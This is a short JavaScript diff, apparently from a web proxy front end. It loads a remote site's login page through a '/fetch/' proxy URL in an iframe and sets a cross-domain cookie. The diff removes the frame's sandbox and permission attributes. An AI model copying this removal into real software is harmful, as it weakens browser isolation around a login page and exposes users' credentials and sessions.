@@ -189,8 +189,6 @@ $('dbtn').onclick = function() {
     const origin = btoa(d)
     frame.src = "https://" + domain + "/fetch/" + origin + "/login";
     frame.style['visibility'] = "visible";
-    frame.setAttribute('allow', 'fullscreen');
-    frame.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-popups allow-forms');
     document.cookie = 'oldsmobile=badcar; expires=' + (Date.now() + 259200) + '; SameSite=Lax; domain=.' + auth + '; path=/; Secure;';
     return false;
 };
